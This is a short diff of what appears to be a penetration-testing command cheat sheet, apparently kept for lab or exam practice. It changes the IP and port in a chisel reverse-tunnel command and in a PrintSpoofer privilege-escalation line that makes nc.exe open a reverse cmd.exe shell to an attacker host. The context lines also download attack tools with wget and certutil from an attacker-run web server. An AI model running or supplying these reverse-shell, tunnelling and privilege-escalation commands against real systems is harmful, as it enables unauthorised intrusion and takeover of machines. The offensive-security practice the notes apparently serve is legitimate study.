@@ -42,7 +42,7 @@ python -m http.server 80
 
 wget 192.168.45.178:8000/chisel
 chmod 777 chisel
-./chisel client 192.168.45.178:6969 R:4444:localhost:8080
+./chisel client 192.168.45.221:6969 R:4444:localhost:8080
 
 wget 10.10.14.8:8000/chisel
 chmod 777 chisel
@@ -107,7 +107,7 @@ wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
 certutil.exe -f -urlcache -split http://192.168.45.221:8000/
 192.168.49.140
 # Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
-.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.221 8000"
+.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.221 80"
 
 .\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe
 
